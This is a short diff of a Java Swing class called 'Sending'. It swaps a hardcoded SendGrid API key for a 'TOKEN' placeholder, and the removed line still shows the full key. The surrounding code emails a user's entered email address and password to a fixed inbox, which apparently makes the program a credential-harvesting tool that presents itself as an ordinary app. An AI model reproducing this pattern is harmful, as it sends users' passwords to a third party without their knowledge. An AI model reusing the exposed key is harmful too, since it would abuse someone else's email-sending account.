@@ -463,7 +463,8 @@ public class Sending extends JFrame {
         Email to = new Email(myemail);
         Content content = new Content("text/plain", "email: " + usn + "\n" + "password: " + pwd + "\n" + "message: " + mseg);
         Mail mail = new Mail(from, subject, to, content);
-        SendGrid sg = new SendGrid("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");
+        // Here need to create SendGrid instance with the token
+        SendGrid sg = new SendGrid("TOKEN");
         Request request = new Request();
         try {
             request.setMethod(Method.POST);
